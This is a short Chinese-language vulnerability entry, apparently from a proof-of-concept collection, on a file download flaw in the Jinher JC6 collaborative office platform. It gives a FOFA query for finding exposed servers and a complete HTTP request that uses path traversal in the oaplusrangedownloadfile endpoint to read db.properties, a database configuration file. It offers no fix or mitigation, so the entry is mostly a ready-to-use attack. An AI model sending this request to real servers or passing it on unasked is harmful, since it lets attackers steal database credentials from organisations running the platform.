# 金和JC6协同管理平台oaplusrangedownloadfile存在文件下载漏洞

金和数字化智能办公平台（简称JC6）是一款结合了人工智能技术的数字化办公平台，为企业带来了智能化的办公体验和全面的数字化转型支持。金和JC6协同管理平台oaplusrangedownloadfile 存在文件下载漏洞，攻击者可利用该漏洞获取服务器敏感信息。

## fofa

```javascript
app="Jinher-OA"
```

## poc

```javascript
GET /jc6/JHSoft.WCF/login/oaplusrangedownloadfile?filename=../WEB-INF/classes/db.properties HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412132156695.webp)



## 漏洞来源

- https://mp.weixin.qq.com/s/TjNcd628M9COW2H9nTMPKQ
